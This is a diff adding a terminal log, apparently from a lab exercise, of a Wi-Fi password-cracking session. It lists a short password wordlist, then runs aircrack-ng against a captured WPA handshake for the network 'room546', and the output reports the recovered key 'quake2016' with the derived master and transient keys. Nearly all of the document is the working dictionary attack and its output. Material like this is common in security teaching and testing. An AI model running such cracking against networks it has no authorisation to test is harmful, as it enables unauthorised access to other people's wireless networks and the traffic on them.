@@ -1,0 +1,66 @@
+[oglandx@oglandx lab]$ cat ../etc/dict 
+fhiwehfiwe
+3fj9283j39
+f2h39ifhu2i3
+3jf9i23fj3
+efjwoiejbt
+wvj3ijvt9w
+3vtwhtiuwhvtq
+3vhqihtiuhq8
+32hv8rh8
+3v2h8urh8
+3h854ybh459hy
+ggrjg98erjger
+wfjawfheisuf
+fh4933h
+helloworld
+fhe9uew
+password
+jf91032g0i32
+quake2016
+f239fh923f
+jf320ifj23f
+unreal2018
+fi203jf20if3
+fh392fh923f
+3fh29fh302
+something2010
+[oglandx@oglandx lab]$ ls
+airodump_dump-01.cap
+[oglandx@oglandx lab]$ sudo aircrack-ng airodump_dump-01.cap -w ../etc/dict 
+Opening airodump_dump-01.cap
+Read 38885 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  E0:3F:49:8A:44:30  room546                   WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening airodump_dump-01.cap
+Reading packets, please wait...
+
+
+
+
+
+                                 Aircrack-ng 1.2 rc4
+
+      [00:00:00] 4/25 keys tested (267.33 k/s) 
+
+      Time left: 0 seconds                                      16.00%
+
+                           KEY FOUND! [ quake2016 ]
+
+
+      Master Key     : 0F 91 45 EC CA 4B CF 29 81 AC A1 AC 5C EA CB 7F 
+                       DC 1D B8 64 2F 18 65 93 BE 04 5D 8C EE C6 E7 20 
+
+      Transient Key  : 2F 79 52 C8 8A F0 C8 8D D1 CF 73 29 5F 8A CC DE 
+                       AA F2 29 77 2D 40 F5 CE 4F B8 EB E4 11 BA DD 34 
+                       90 3A 9C 62 7A C1 63 28 50 6C D1 9A CB 89 C4 62 
+                       77 E7 B1 33 94 9C A7 3E A6 3F 70 2E 04 11 D5 AD 
+
+      EAPOL HMAC     : 1D AF 65 88 11 0C BA AF 9F DC 22 8D 3E 3D 8B 22 
+[oglandx@oglandx lab]$ 
+
